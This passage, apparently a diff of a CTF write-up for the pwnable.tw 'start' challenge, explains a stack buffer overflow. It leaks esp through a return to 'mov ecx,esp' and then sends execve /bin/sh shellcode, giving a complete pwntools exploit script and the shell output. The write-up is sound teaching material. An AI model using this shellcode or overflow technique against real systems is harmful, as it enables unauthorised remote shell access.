+<p>Note: if you want the exploit to work the same in pwndbg (gdb) and normal execution, you have to take care of <a href="https://russtone.io/2016/07/31/test-exploits-under-gdb/">environment variables</a>. Here we are trying to exploit the binary remotely, who knows what they have on their server and the stack would be unpredictable so we have to take a different approach instead of hardcoding the shellcode (or nop sled) address (even with nop sled, which we cannot overabuse, it is still painful to find out the right address).</p>
+
+<h3 id="34-leaking-the-esp-address"><i>3.4 Leaking the esp address</i></h3>
+<p>Scroll above and you can see when we run the checksec command, the PIE has no PIE. A No PIE (Position Independent Executable) binary tells the loader which virtual address it should use (and keeps its memory layout quite static). Hence, attacks against this application know up-front how the virtual memory for this application is (partially) organized.</p>
+
+<p>That means the instruction addresses in our local binary is the same as in the remote server. Look at the <a href="#assembly-analysis">instruction</a> again. The below instruction clears the stack after the main functionality of the program is done.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">0x08048099 &lt;+57&gt;</span><span class="pi">:</span>    <span class="s">add    esp,0x14                // clean the &lt;Let's start the CTF&gt; in the stack)</span>
+<span class="s">0x0804809c &lt;+60&gt;</span><span class="pi">:</span>    <span class="s">ret                            // pop the exit function</span>
+</code></pre></div></div>
+
+<p>We can overflow the ret with <span style="color:#007bff">0x08048087</span> which is the address of the instruction <code class="language-plaintext highlighter-rouge">mov ecx,esp</code>. <code class="language-plaintext highlighter-rouge">ecx</code> is an argument to the syscall write. Since the stack has been cleared and the exit instruction has been overwritten, now on the stack there is only the address of esp left. And esp will be pointing there. The <code class="language-plaintext highlighter-rouge">mov ecx, esp</code> instruction therefore puts the address of esp into ecx, making the syscall writes the esp address to the screen.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">0x08048087 &lt;+39&gt;</span><span class="pi">:</span>    <span class="s">mov    ecx,esp</span>
+<span class="s">0x08048089 &lt;+41&gt;</span><span class="pi">:</span>    <span class="s">mov    dl,0x14</span>
+<span class="s">0x0804808b &lt;+43&gt;</span><span class="pi">:</span>    <span class="s">mov    bl,0x1</span>
+<span class="s">0x0804808d &lt;+45&gt;</span><span class="pi">:</span>    <span class="s">mov    al,0x4</span>
+<span class="s">0x0804808f &lt;+47&gt;</span><span class="pi">:</span>    <span class="s">int    0x80</span>
+</code></pre></div></div>
+
+<h3 id="35-actually-exploiting-the-binary-remotely"><i>3.5 Actually exploiting the binary remotely</i></h3>
+<p>What is the point of knowing the esp address? Well, now we can add 20 more bytes to that address and got ourselves the address of our shellcode (without NOP). 
+So the final payload (after leaking the esp address):</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  AAAAA...AAAAAAA        +     esp +20 (since esp is before 20A)           +      shellcode
+────────────────────           ──────────────────────────────────             
+         ▼                              ▼                                 
+  20 As of padding              Address of shellcode          
+</code></pre></div></div>
+
+<p>Now we write the final exploit code:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">pads</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x14</span>
+<span class="n">esp_leak_payload</span> <span class="o">=</span> <span class="n">pads</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08048087</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'chall.pwnable.tw'</span><span class="p">,</span><span class="mi">10000</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">':'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">esp_leak_payload</span><span class="p">)</span>
+<span class="n">tmp</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">esp</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">tmp</span><span class="p">[:</span><span class="mi">4</span><span class="p">])</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80</span><span class="s">"</span>
+<span class="n">final_payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mi">20</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">esp</span><span class="o">+</span><span class="mi">20</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcode</span>
+<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">final_payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>And we got the shell!</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>+] Opening connection to chall.pwnable.tw on port 10000: Done
+/home/dan09/CTF/Pwnable/start.py:5: BytesWarning: Text is not bytes<span class="p">;</span> assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  p.recvuntil<span class="o">(</span><span class="s1">':'</span><span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
+<span class="nv">$ </span><span class="nb">ls
+</span>bin
+boot
+dev
+etc
+home
+lib
+lib32
+lib64
+libx32
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+<span class="nv">$ </span>
 </code></pre></div></div>
 
 
